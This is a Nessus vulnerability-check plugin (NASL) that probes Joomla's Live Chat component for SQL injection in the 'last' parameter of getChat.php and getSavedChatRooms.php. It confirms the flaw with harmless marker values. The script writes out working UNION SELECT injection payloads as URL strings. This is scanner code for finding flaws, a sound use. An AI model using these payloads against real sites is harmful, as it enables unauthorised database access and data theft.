#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(35109);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2008-6881", "CVE-2008-6883");
  script_bugtraq_id(32803);
  script_xref(name:"milw0rm", value:"7441");
  script_xref(name:"OSVDB", value:"56710");
  script_xref(name:"OSVDB", value:"56711");

  script_name(english:"Live Chat Component for Joomla! last Variable SQL Injection");
  script_summary(english:"Tries to manipulate chat XML output");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by SQL
injection vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Live Chat, a third-party web-based chat
plugin for Mambo / Joomla. 

The version of Live chat installed on the remote host fails to
sanitize user-supplied input to the 'last' parameter of the
'getChat.php' and 'getSavedChatRooms.php' scripts under
'administrator/components/com_livechat' before using it to construct
database queries.  Regardless of PHP's 'magic_quotes_gpc' setting, an
unauthenticated attacker may be able to exploit this issue to
manipulate database queries, leading to disclosure of sensitive
information, modification of data, or attacks against the underlying
database." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


magic1 = unixtime();
magic2 = rand();

if (thorough_tests) 
{
  exploits = make_list(
    string(
      "/administrator/components/com_livechat/getChat.php?",
      "chat=0&",
      "last=1 UNION SELECT 1,unhex(hex(concat(", magic1, ",0x3a,", magic2, "))),3,4"
    ),
    string(
      "/administrator/components/com_livechat/getSavedChatRooms.php?",
      "chat=0&",
      "last=1 UNION SELECT 1,unhex(hex(concat(", magic1, ",0x3a,", magic2, "))),3"
    )
  );
}
else 
{
  exploits = make_list(
    string(
      "/administrator/components/com_livechat/getChat.php?",
      "chat=0&",
      "last=1 UNION SELECT 1,unhex(hex(concat(", magic1, ",0x3a,", magic2, "))),3,4"
    )
  );
}


# Test an install.
install = get_kb_item(string("www/", port, "/joomla"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the issue to manipulate record of the last chat.
  foreach exploit (exploits)
  {
    url = string(dir, exploit);
    url = str_replace(find:" ", replace:"%20", string:url);

    req = http_mk_get_req(port:port, item:url);
    res = http_send_recv_req(port:port, req:req);
    if (res == NULL) exit(0);

    # There's a problem if we could manipulate the user element.
    if (
      (
        "getChat.php" >< exploit &&
        string("<user>", magic1, ":", magic2, "</user>") >< res[2]
      ) ||
      (
        "getSavedChatRooms.php" >< exploit &&
        string("<name>", magic1, ":", magic2, "</name>") >< res[2]
      )
    )
    {
      if (report_verbosity && '.gif' >!< file)
      {
        req_str = http_mk_buffer_from_req(req:req);
        report = string(
          "\n",
          "Nessus was able to verify the vulnerability exists using the following\n",
          "request :\n",
          "\n",
          "  ", build_url(port:port, qs:url), "\n"
        );
        security_hole(port:port, extra:report);
      }
      else security_hole(port);

      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
